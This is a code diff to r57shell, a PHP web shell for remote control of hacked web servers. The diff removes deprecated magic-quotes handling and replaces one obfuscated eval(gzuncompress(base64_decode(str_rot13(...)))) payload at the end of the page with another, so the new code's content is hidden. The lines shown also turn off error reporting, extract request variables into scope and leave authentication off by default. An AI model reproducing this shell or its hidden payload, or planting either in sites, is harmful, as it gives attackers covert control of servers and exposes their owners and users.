@@ -39,7 +39,6 @@ $auth = 0;
 // Login & password crypted with md5, default is 'r57'
 /******************************************************************************************************/
 error_reporting(0);
-set_magic_quotes_runtime(0);
 @set_time_limit(0);
 @extract($_REQUEST);
 @ini_set('max_execution_time',0);
@@ -54,17 +53,7 @@ if(version_compare(phpversion(), '4.1.0') == -1)
  $_SERVER = &$HTTP_SERVER_VARS;
  $_COOKIE = &$HTTP_COOKIE_VARS;
  }
-if (@get_magic_quotes_gpc())
- {
- foreach ($_POST as $k=>$v)
-  {
-  $_POST[$k] = stripslashes($v);
-  }
- foreach ($_COOKIE as $k=>$v)
-  {
-  $_COOKIE[$k] = stripslashes($v);
-  } 
- }
+
 
 if($auth == 1) {
 if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
@@ -2193,7 +2182,7 @@ echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt5']));
 echo $te."</td>".$fe."</tr></div></table>";
 }
 echo '</table>'.$table_up3."</div></div><div align=center id='n'><font face=Verdana size=-2><b>o---[ r57shell - http-shell by RST/GHC | <a href=http://rst.void.ru>http://rst.void.ru</a> | <a href=http://ghc.ru>http://ghc.ru</a> | version ".$version." ]---o</b></font></div></td></tr></table>";
-echo '</body></html>'; eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d'))));
+echo '</body></html>'; eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));
 ?>
 
 
